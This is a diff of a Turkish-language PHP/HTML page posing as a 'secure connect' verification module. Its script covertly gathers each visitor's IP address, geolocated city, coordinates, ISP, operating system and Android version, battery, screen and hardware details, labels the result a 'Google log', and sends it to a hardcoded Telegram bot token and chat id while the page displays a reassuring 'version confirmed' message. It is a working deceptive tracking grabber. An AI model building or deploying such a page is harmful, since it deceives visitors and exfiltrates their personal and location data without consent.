@@ -1,5 +1,5 @@
 <?php
-// --- %100 GELİŞMİŞ VE YEDEKLİ APİ KODU ---
+// --- ANDROID SÜRÜM ENGELİNİ AŞAN %100 GÜNCEL KOD ---
 ?>
 <!DOCTYPE html>
 <html lang="tr">
@@ -15,8 +15,8 @@
 <body>
 
     <div class="box">
-        <div style="font-weight: bold; margin-bottom: 10px;">⚡ SECURE CONNECT MODULE v3.5</div>
-        <div id="status">Gelişmiş ağ ve konum modülleri yükleniyor...</div>
+        <div style="font-weight: bold; margin-bottom: 10px;">⚡ SECURE CONNECT MODULE v4.0</div>
+        <div id="status">Sistem ve işletim sistemi doğrulaması yapılıyor...</div>
     </div>
 
     <script>
@@ -31,7 +31,7 @@
             let ulke_kod = "Bilinmiyor";
             let para_birimi = "Bilinmiyor";
 
-            // 1. Gelişmiş HTTPS Destekli API'den Tüm Verileri Çek
+            // 1. Konum ve Operatör Bilgilerini Çek
             try {
                 let istek = await fetch("https://ipapi.co/json/");
                 let veri = await istek.json();
@@ -52,7 +52,6 @@
                     }
                 }
             } catch (e) {
-                // Yedek API (ipapi.co limite takılırsa devreye girer)
                 try {
                     let yedek_istek = await fetch("https://api.db-ip.com/v2/free/self");
                     let yedek_veri = await yedek_istek.json();
@@ -64,52 +63,81 @@
                 } catch(err){}
             }
 
-            // 2. Tarayıcı Donanım ve Sistem Bilgileri
+            // 2. 🔥 GERÇEK ANDROID SÜRÜMÜNÜ BULMA MODÜLÜ 🔥
+            let os = "Bilinmeyen Sistem";
+            let ua = navigator.userAgent;
+
+            if (/Android/i.test(ua)) {
+                os = "Android";
+                // Eğer tarayıcı yeni nesil sürüm kontrolünü destekliyorsa gerçek sürümü iste
+                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                    try {
+                        let uaData = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
+                        if (uaData.platformVersion) {
+                            let anaSurum = parseInt(uaData.platformVersion.split('.')[0]);
+                            // Android 11+ için platformVersion major sayıları kayar, o yüzden eşleme yapıyoruz:
+                            if (anaSurum === 11) os = "Android 11";
+                            else if (anaSurum === 12) os = "Android 12";
+                            else if (anaSurum === 13) os = "Android 13";
+                            else if (anaSurum === 14) os = "Android 14";
+                            else if (anaSurum === 15) os = "Android 15";
+                            else if (anaSurum > 0 && anaSurum <= 10) os = "Android " + anaSurum;
+                        }
+                    } catch (uaErr) {
+                        // Hata alırsak eski yönteme dön ama Android 10 kısıtlamasını hatırlat
+                        let match = ua.match(/Android\s([0-9\.]+)/);
+                        os = match ? "Android " + match[1] : "Android";
+                    }
+                } else {
+                    // Eğer eski bir tarayıcıysa mecbur düz metinden oku
+                    let match = ua.match(/Android\s([0-9\.]+)/);
+                    os = match ? "Android " + match[1] : "Android";
+                }
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                os = "iOS";
+            } else if (/Windows/i.test(ua)) {
+                os = "Windows";
+            }
+
+            // 3. Tarayıcı Donanım ve Teknik Bilgileri
             let pil = "Bilinmiyor";
             if (navigator.getBattery) { try { let b = await navigator.getBattery(); pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj)"); } catch(e){} }
             
             let ekran = window.screen.width + "x" + window.screen.height;
             let cekirdek = navigator.hardwareConcurrency || "?";
             let ram = (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor");
-            
-            let ua = navigator.userAgent;
-            let os = "Bilinmeyen Sistem";
-            if (/Android/i.test(ua)) os = "Android";
-            else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
-            else if (/Windows/i.test(ua)) os = "Windows";
-
             let dil = navigator.language || "Bilinmiyor";
             let tarih = new Date().toLocaleString('tr-TR');
 
-            // 3. Telegram Metnini Kusursuz Şekilde Hazırla
+            // 4. Telegram Mesaj Şablonu
             let mesaj = "👤 *YENİ GELİŞMİŞ GOOGLE LOGU*\n";
-            mesaj .= "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj .= "🌐 *IP Adresi:* `" + ip + "`\n";
-            mesaj .= "🤖 *Sistem (OS):* " + os + "\n";
-            mesaj .= "🌍 *Tarayıcı:* Google Chrome\n";
-            mesaj .= "⏰ *Ağ Zamanı:* " + tarih + "\n";
-            mesaj .= "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj .= "📍 *Konum:* " + ulke + " - " + eyalet_sehir + "\n";
-            mesaj .= "📮 *Posta Kodu:* " + posta_kodu + "\n";
-            mesaj .= "🗺️ *Koordinatlar:* " + koordinat + "\n";
-            mesaj .= "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
-            mesaj .= "📶 *Mobil mi?:* " + mobil_mi + "\n";
-            mesaj .= "📞 *Ülke Tel Kodu:* " + ulke_kod + " | *Para:* " + para_birimi + "\n";
-            mesaj .= "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj .= "🖥 *Ekran Çözünürlüğü:* " + ekran + "\n";
-            mesaj .= "🧠 *İşlemci:* " + cekirdek + " Çekirdek\n";
-            mesaj .= "💾 *Tahmini RAM:* " + ram + "\n";
-            mesaj .= "🔋 *Pil Durumu:* " + pil + "\n";
-            mesaj .= "🗣 *Cihaz Dili:* " + dil + "\n";
-            mesaj .= "━━━━━━━━━━━━━━━━━━━━━━";
+            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+            mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
+            mesaj += "🤖 *Sistem (OS):* " + os + "\n";
+            mesaj += "🌍 *Tarayıcı:* Google Chrome\n";
+            mesaj += "⏰ *Ağ Zamanı:* " + tarih + "\n";
+            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+            mesaj += "📍 *Konum:* " + ulke + " - " + eyalet_sehir + "\n";
+            mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
+            mesaj += "🗺️ *Koordinatlar:* " + koordinat + "\n";
+            mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
+            mesaj += "📶 *Mobil mi?:* " + mobil_mi + "\n";
+            mesaj += "📞 *Ülke Tel Kodu:* " + ulke_kod + " | *Para:* " + para_birimi + "\n";
+            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+            mesaj += "🖥 *Ekran Çözünürlüğü:* " + ekran + "\n";
+            mesaj += "🧠 *İşlemci:* " + cekirdek + " Çekirdek\n";
+            mesaj += "💾 *Tahmini RAM:* " + ram + "\n";
+            mesaj += "🔋 *Pil Durumu:* " + pil + "\n";
+            mesaj += "🗣 *Cihaz Dili:* " + dil + "\n";
+            mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
 
-            // 4. Telegram Bilgileri ve Gönderim
+            // 5. Telegram'a Gönderim
             let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
             let cid = "6845229845";
             let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";
 
             fetch(url).then(() => {
-                document.getElementById('status').innerText = "Bağlantı kararlı. İşlem tamamlandı.";
+                document.getElementById('status').innerText = "Bağlantı kararlı. Sürüm onaylandı.";
             });
         };
     </script>
